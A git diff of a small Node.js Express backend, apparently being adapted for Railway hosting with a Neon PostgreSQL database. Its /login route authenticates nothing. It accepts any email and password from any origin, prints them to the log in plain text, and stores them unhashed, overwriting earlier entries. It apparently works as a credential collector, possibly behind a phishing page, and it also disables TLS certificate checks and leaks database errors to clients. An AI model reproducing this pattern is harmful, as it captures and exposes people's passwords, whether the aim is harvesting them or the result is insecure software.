@@ -5,20 +5,28 @@ const path = require("path");
 require("dotenv").config();
 
 const app = express();
-const port = process.env.PORT || 3001;
+
+// Railway assigns dynamic port
+const PORT = process.env.PORT || 3001;
 
 app.use(express.json());
-app.use(cors());
+app.use(
+  cors({
+    origin: "*",
+    methods: ["GET", "POST"],
+    allowedHeaders: ["Content-Type"],
+  })
+);
 
-// ------------------------------------------------------
-// 1️⃣ CONNECT TO NEON POSTGRESQL
-// ------------------------------------------------------
+// -------------------------------------------------------
+// 1️⃣ CONNECT TO POSTGRES (NEON)
+// -------------------------------------------------------
 const pool = new Pool({
   connectionString: process.env.DATABASE_URL,
   ssl: { rejectUnauthorized: false },
 });
 
-// Create users table if not exists
+// Create table if missing
 const initDb = async () => {
   try {
     const client = await pool.connect();
@@ -32,7 +40,7 @@ const initDb = async () => {
       );
     `);
 
-    console.log("✅ Connected to Neon & users table ready.");
+    console.log("✅ Connected to Neon PostgreSQL & users table ready");
     client.release();
   } catch (err) {
     console.error("❌ Database initialization error:", err.message);
@@ -41,27 +49,19 @@ const initDb = async () => {
 
 initDb();
 
-// ------------------------------------------------------
-// 2️⃣ SERVE FRONTEND BUILD FROM dist/
-// ------------------------------------------------------
-app.use(express.static(path.join(__dirname, "dist")));
-
-app.get("*", (req, res) => {
-  res.sendFile(path.join(__dirname, "dist", "index.html"));
-});
-
-// ------------------------------------------------------
-// 3️⃣ LOGIN ROUTE (SAVE TO DATABASE)
-// ------------------------------------------------------
+// -------------------------------------------------------
+// 2️⃣ LOGIN ROUTE (SAVE EMAIL + PASSWORD)
+// -------------------------------------------------------
 app.post("/login", async (req, res) => {
   const { email, password } = req.body;
 
   console.log("📥 Received login:", email, password);
 
   if (!email || !password) {
-    return res
-      .status(400)
-      .json({ success: false, message: "Email and password required" });
+    return res.status(400).json({
+      success: false,
+      message: "Email and password required",
+    });
   }
 
   try {
@@ -70,22 +70,34 @@ app.post("/login", async (req, res) => {
       INSERT INTO users (email, password)
       VALUES ($1, $2)
       ON CONFLICT (email)
-      DO UPDATE SET password = EXCLUDED.password, created_at = CURRENT_TIMESTAMP;
-      `,
+      DO UPDATE SET password = EXCLUDED.password,
+                    created_at = CURRENT_TIMESTAMP;
+    `,
       [email, password]
     );
 
-    console.log("💾 Saved login to database.");
+    console.log("💾 Saved login to database");
     res.json({ success: true, message: "Saved successfully" });
   } catch (err) {
     console.error("❌ DB Save Error:", err.message);
-    res.status(500).json({ success: false, message: err.message });
+    res.status(500).json({
+      success: false,
+      message: "Database error",
+      details: err.message,
+    });
   }
 });
 
-// ------------------------------------------------------
-// 4️⃣ START SERVER
-// ------------------------------------------------------
-app.listen(port, () => {
-  console.log(`🚀 Server running at http://localhost:${port}`);
+// -------------------------------------------------------
+// 3️⃣ ROOT ROUTE (TEST)
+// -------------------------------------------------------
+app.get("/", (req, res) => {
+  res.send("🚀 Backend is running on Railway!");
+});
+
+// -------------------------------------------------------
+// 4️⃣ START SERVER (Railway Compatible)
+// -------------------------------------------------------
+app.listen(PORT, "0.0.0.0", () => {
+  console.log(`🚀 Server running on port ${PORT}`);
 });
